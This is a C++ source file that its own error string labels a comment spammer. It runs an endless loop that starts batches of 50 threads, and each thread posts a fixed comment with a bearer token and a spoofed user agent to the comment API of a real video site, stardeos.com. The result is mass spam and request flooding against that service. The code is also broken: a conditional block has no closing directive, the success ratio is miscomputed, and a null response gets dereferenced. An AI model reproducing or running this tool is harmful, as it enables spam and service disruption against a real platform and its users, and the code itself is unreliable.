#define CPPHTTPLIB_OPENSSL_SUPPORT
#include <chrono>
#include "httplib.h"
#include <iostream>
#include <thread>
#ifdef STSP_LINUX_VER
    #pragma comment(lib, "libssl.so")
    #pragma comment(lib, "libcrypto.so")
#elif STSP_WINDOWS_VER
    #pragma comment(lib, "libssl.lib")
    #pragma comment(lib, "libcrypto.lib")
#else
    #error "No version selected for stardeos comment spammer."

using namespace std;
volatile unsigned long long int requests = 0, failed = 0;

void masshttp(string url, string route) {
    using namespace httplib;
    string body_comment = "Contenido del comentario";
    string video_id = "id";
    auto token = "Bearer token";
    string body = "{\"content\":\"" + body_comment + "\",\"stardusts\":0,\"type\":1,\"parent\":\"" + video_id + "\"}";
    Headers hdr = {
        {"User-Agent", "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.0.1) Gecko/20021216 Chimera/0.6"},
        {"Referer", "https://stardeos.com/api/v2/comments"},
        {"Authorization", token}
    };
    float ratio;
    Client request(url.c_str());
    auto res = request.Post(route.c_str(), hdr, body.c_str(), body.size(), "application/json");
    if (res && to_string(res->status).substr(0, 1) == "2") {
        ratio = float(float(100*requests) / failed);
        requests++;
    }
    else {
        failed++;
    }
    cout << "[" << res->status << "]" << requests << " Failed/N.A: " << failed << "\nSuccess: " << ratio << "% Response Len: " << res->body.size() << "\n";
    return;
}

int main(int argc, char* argv[]) {
    using namespace chrono_literals;
    while (true) {
        try {
            for (unsigned i = 0; i < 50; i++) {
                try {
                    thread t(masshttp, "https://stardeos.com", "/api/v2/comments");
                    t.detach();
                }
                catch (...) {
                    this_thread::sleep_for(1s);
                }
            }
            this_thread::sleep_for(200ms);
        }
        catch (...) {}
    }
    return 0;
}
